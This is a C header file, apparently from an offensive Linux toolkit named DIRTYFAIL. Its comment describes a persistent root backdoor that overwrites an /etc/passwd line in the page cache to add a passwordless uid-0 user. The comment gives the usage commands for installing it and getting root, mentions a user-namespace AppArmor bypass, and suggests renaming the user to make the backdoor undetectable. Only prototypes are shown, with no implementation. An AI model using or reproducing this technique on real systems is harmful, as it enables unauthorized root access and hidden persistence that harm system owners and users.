/*
 * DIRTYFAIL — backdoor.h
 *
 * Persistent uid-0 backdoor in the /etc/passwd page cache.
 *
 * MORE INVASIVE than the UID-flip exploits in copyfail.c /
 * dirtyfrag_esp.c / dirtyfrag_rxrpc.c. Where those modify the calling
 * user's UID for one shell session, this mode inserts a brand-new
 * passwordless uid-0 user "dirtyfail" by length-matched overwrite of
 * an existing nologin/false/sync line. The substituted line stays in
 * the page cache until eviction, so:
 *
 *     ./dirtyfail --exploit-backdoor    # install + drop into root
 *     exit                              # back to your normal shell
 *     su - dirtyfail                    # any user, any time → root
 *
 * The username "dirtyfail" is intentionally chosen to match this
 * project — anyone auditing /etc/passwd will spot it immediately,
 * which is the opposite of stealth-by-default. If you need an
 * undetectable backdoor for an authorized red-team engagement,
 * change NEW_USER in backdoor.c.
 *
 * The on-disk /etc/passwd is unchanged. State (LINE_OFF, original
 * VICTIM_LINE) is persisted at /var/tmp/.dirtyfail.state so that
 * `--cleanup-backdoor` can restore the original line byte-by-byte
 * via the same 1-byte primitive.
 *
 * This mode requires the GCM single-byte primitive (`cfg_1byte_write`)
 * to land arbitrary bytes at arbitrary offsets — the 4-byte authencesn
 * primitive can't easily rewrite a 50-byte line that doesn't align
 * to 4-byte boundaries.
 *
 * Technique credit: 0xdeadbeefnetwork/Copy_Fail2-Electric_Boogaloo
 * (`run.sh`); reimplemented here as a single C function.
 */

#ifndef DIRTYFAIL_BACKDOOR_H
#define DIRTYFAIL_BACKDOOR_H

#include "common.h"

df_result_t backdoor_install(bool do_shell);
df_result_t backdoor_cleanup(void);

/* INNER variants — run inside the AA bypass userns. The inner reads
 * the operation parameters from env vars set by the outer:
 *   DIRTYFAIL_INNER_MODE        = backdoor-install | backdoor-cleanup
 *   DIRTYFAIL_LINE_OFF          = byte offset of the victim line
 *   DIRTYFAIL_VICTIM_LINE       = original /etc/passwd line bytes
 *   DIRTYFAIL_TARGET_LINE       = (install only) replacement bytes
 */
df_result_t backdoor_install_inner(void);
df_result_t backdoor_cleanup_inner(void);

/* Used by --list-state. Returns true if a backdoor state file is present
 * (and prints a summary), false if no file exists. Side-effect free. */
bool backdoor_list_state(void);

#endif
